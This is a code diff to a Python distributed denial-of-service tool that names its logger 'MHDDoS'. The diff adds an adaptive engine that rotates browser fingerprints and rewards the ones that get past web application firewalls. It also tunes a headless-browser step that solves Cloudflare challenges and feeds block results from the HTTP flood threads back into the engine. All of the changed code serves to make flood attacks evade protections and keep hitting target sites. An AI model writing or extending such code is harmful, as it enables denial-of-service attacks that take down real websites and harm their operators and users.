@@ -65,7 +65,7 @@ except ImportError:
     PLAYWRIGHT_INSTALLED = False
 
 # --- Tactical Configuration (v1.1.3) ---
-__version__: str = "1.1.5"
+__version__: str = "1.1.6"
 __dir__: Path = Path(__file__).parent
 
 # Setup High-Signal Logging
@@ -75,7 +75,11 @@ basicConfig(
     stream=sys.stdout,
 )
 logger = getLogger("MHDDoS")
-logger.setLevel(logging.INFO)
+if "--debug" in argv or "--verbose" in argv:
+    logger.setLevel(logging.DEBUG)
+    logger.debug("[*] VERBOSE DIAGNOSTICS ENABLED: Deep tactical tracing active.")
+else:
+    logger.setLevel(logging.INFO)
 
 # Silence library noise for maximum tactical focus
 logging.getLogger("urllib3").setLevel(logging.CRITICAL)
@@ -823,6 +827,99 @@ class Tools:
             sock.close()
 
 
+class MLSmartBypassEngine:
+    """Adaptive Heuristic Feedback Loop for WAF Evasion (ML-inspired)"""
+    def __init__(self):
+        self.lock = Lock()
+        self.fingerprints = [
+            {
+                "id": "chrome_win",
+                "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "headers": (
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
+                    "Accept-Encoding: gzip, deflate, br\r\n"
+                    "Accept-Language: en-US,en;q=0.9\r\n"
+                    "Sec-Ch-Ua: \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"\r\n"
+                    "Sec-Ch-Ua-Mobile: ?0\r\n"
+                    "Sec-Ch-Ua-Platform: \"Windows\"\r\n"
+                    "Sec-Fetch-Dest: document\r\n"
+                    "Sec-Fetch-Mode: navigate\r\n"
+                    "Sec-Fetch-Site: none\r\n"
+                    "Sec-Fetch-User: ?1\r\n"
+                    "Upgrade-Insecure-Requests: 1\r\n"
+                ),
+                "weight": 10.0,
+                "delay": 0.0
+            },
+            {
+                "id": "firefox_mac",
+                "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0",
+                "headers": (
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
+                    "Accept-Encoding: gzip, deflate, br\r\n"
+                    "Accept-Language: en-US,en;q=0.5\r\n"
+                    "Sec-Fetch-Dest: document\r\n"
+                    "Sec-Fetch-Mode: navigate\r\n"
+                    "Sec-Fetch-Site: none\r\n"
+                    "Sec-Fetch-User: ?1\r\n"
+                    "Upgrade-Insecure-Requests: 1\r\n"
+                ),
+                "weight": 10.0,
+                "delay": 0.1 # Slight human-like delay
+            },
+            {
+                "id": "safari_ios",
+                "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+                "headers": (
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                    "Accept-Encoding: gzip, deflate, br\r\n"
+                    "Accept-Language: en-US,en;q=0.9\r\n"
+                    "Sec-Fetch-Dest: document\r\n"
+                    "Sec-Fetch-Mode: navigate\r\n"
+                    "Sec-Fetch-Site: none\r\n"
+                ),
+                "weight": 10.0,
+                "delay": 0.05
+            }
+        ]
+        self.current_best = self.fingerprints[0]
+        self.total_requests = 0
+        self.total_blocks = 0
+
+    def get_fingerprint(self):
+        with self.lock:
+            # Roulette wheel selection based on weight
+            total_weight = sum(f["weight"] for f in self.fingerprints)
+            if total_weight <= 0:
+                for f in self.fingerprints: f["weight"] = 10.0
+                total_weight = sum(f["weight"] for f in self.fingerprints)
+            
+            pick = random.uniform(0, total_weight)
+            current = 0
+            for f in self.fingerprints:
+                current += f["weight"]
+                if current > pick:
+                    if self.current_best["id"] != f["id"]:
+                        logger.debug(f"[*] ML_ENGINE: Switching active fingerprint to {f['id']} (Weight: {f['weight']:.1f})")
+                        self.current_best = f
+                    return f
+            return self.fingerprints[0]
+
+    def report_result(self, fp_id: str, success: bool):
+        with self.lock:
+            for f in self.fingerprints:
+                if f["id"] == fp_id:
+                    if success:
+                        f["weight"] = min(50.0, f["weight"] * 1.05) # Reward
+                        logger.debug(f"[*] ML_ENGINE: Pattern {fp_id} SUCCESS. Weight increased to {f['weight']:.1f}")
+                    else:
+                        f["weight"] = max(1.0, f["weight"] * 0.8) # Penalize
+                        logger.debug(f"[!] ML_ENGINE: Pattern {fp_id} FAILED/BLOCKED. Weight decreased to {f['weight']:.1f}")
+                    break
+
+ML_ENGINE = MLSmartBypassEngine()
+
+
 class BrowserEngine:
     """Advanced Browser Fingerprinting Engine for bypassing JS/Captcha challenges"""
     
@@ -874,11 +971,14 @@ class BrowserEngine:
                 
                 logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Navigating and solving challenges...{bcolors.RESET}")
                 
-                # Wait until network is mostly idle (indicates challenge passed and page loaded)
-                response = page.goto(url, wait_until="networkidle")
+                # Use domcontentloaded instead of networkidle as WAF challenges often have continuous background requests
+                try:
+                    response = page.goto(url, wait_until="domcontentloaded", timeout=timeout)
+                except PlaywrightTimeoutError:
+                    logger.warning(f"{bcolors.WARNING}[*] Headless Recon: Initial load timed out. Attempting to proceed with current state...{bcolors.RESET}")
                 
                 # If still stuck on challenge, wait a bit longer for JS to execute
-                if "Just a moment" in page.title() or "Attention Required" in page.title():
+                if "Just a moment" in page.title() or "Attention Required" in page.title() or "Cloudflare" in page.title():
                     logger.info(f"{bcolors.WARNING}[*] Headless Recon: Waiting for JS challenge verification...{bcolors.RESET}")
                     try:
                         page.wait_for_selector("text=Just a moment", state="hidden", timeout=10000)
@@ -1518,45 +1618,18 @@ class HttpFlood(Thread):
             randchoice(["1.0", "1.1", "1.2"]),
         )
         
-        # Advanced Evasion Fingerprints
-        fingerprints = [
-            # Chrome Windows
-            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
-            "Accept-Encoding: gzip, deflate, br\r\n"
-            "Accept-Language: en-US,en;q=0.9\r\n"
-            "Sec-Ch-Ua: \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"\r\n"
-            "Sec-Ch-Ua-Mobile: ?0\r\n"
-            "Sec-Ch-Ua-Platform: \"Windows\"\r\n"
-            "Sec-Fetch-Dest: document\r\n"
-            "Sec-Fetch-Mode: navigate\r\n"
-            "Sec-Fetch-Site: none\r\n"
-            "Sec-Fetch-User: ?1\r\n"
-            "Upgrade-Insecure-Requests: 1\r\n",
-            
-            # Firefox Mac
-            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
-            "Accept-Encoding: gzip, deflate, br\r\n"
-            "Accept-Language: en-US,en;q=0.5\r\n"
-            "Sec-Fetch-Dest: document\r\n"
-            "Sec-Fetch-Mode: navigate\r\n"
-            "Sec-Fetch-Site: none\r\n"
-            "Sec-Fetch-User: ?1\r\n"
-            "Upgrade-Insecure-Requests: 1\r\n",
-            
-            # Safari iOS
-            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-            "Accept-Encoding: gzip, deflate\r\n"
-            "Accept-Language: en-US,en;q=0.9\r\n"
-            "Sec-Fetch-Dest: document\r\n"
-            "Sec-Fetch-Mode: navigate\r\n"
-            "Sec-Fetch-Site: none\r\n"
-        ]
-
-        # Use basic static headers if not explicitly in evasion mode to save CPU
+        # Use ML Engine if evasion is enabled
         if "--evasion" in argv:
-            selected_fp = randchoice(fingerprints)
+            best_fp = ML_ENGINE.get_fingerprint()
+            self._current_fp_id = best_fp["id"]
+            self._current_delay = best_fp["delay"]
+            selected_fp = best_fp["headers"]
             conn_type = randchoice(["keep-alive", "Upgrade"])
+            # Update user agents based on the engine pick
+            self._useragents = [best_fp["ua"]]
         else:
+            self._current_fp_id = None
+            self._current_delay = 0.0
             selected_fp = (
                 "Accept-Encoding: gzip, deflate, br\r\n"
                 "Accept-Language: en-US,en;q=0.9\r\n"
@@ -1585,7 +1658,14 @@ class HttpFlood(Thread):
         self.select(self._method)
         original_rpc = self._rpc
         smart_rpc_enabled = "--smart" in argv
+        evasion_enabled = "--evasion" in argv
+        
         while self._synevent.is_set():
+            if evasion_enabled:
+                self._rebuild_payload()
+                if self._current_delay > 0:
+                    sleep(self._current_delay)
+                    
             if smart_rpc_enabled:
                 # Smart RPC Adjustment
                 if CURRENT_LATENCY.value > 2000 or CURRENT_LATENCY.value == -1.0:
@@ -1593,7 +1673,16 @@ class HttpFlood(Thread):
                 elif CURRENT_LATENCY.value > 0 and CURRENT_LATENCY.value < 500:
                     self._rpc = original_rpc
 
-            self.SENT_FLOOD()
+            try:
+                self.SENT_FLOOD()
+                # If we get here, no direct exception occurred in the flood method
+                if evasion_enabled and self._current_fp_id:
+                    # Reward or penalize based on latency
+                    is_success = (CURRENT_LATENCY.value != -1.0 and CURRENT_LATENCY.value < 3000)
+                    ML_ENGINE.report_result(self._current_fp_id, is_success)
+            except Exception:
+                if evasion_enabled and self._current_fp_id:
+                    ML_ENGINE.report_result(self._current_fp_id, False)
 
     @property
     def SpoofIP(self) -> str:
